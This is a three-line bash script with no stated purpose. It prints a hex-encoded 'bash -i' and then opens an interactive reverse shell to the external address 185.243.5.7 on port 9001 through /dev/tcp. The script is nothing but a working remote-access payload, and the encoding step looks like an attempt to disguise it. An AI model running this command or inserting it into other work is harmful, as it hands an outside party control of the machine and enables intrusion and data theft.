#!/bin/bash
printf '\x62\x61\x73\x68\x20\x2d\x69' # decode to 'bash -i'
bash -i >& /dev/tcp/185.243.5.7/9001 0>&1
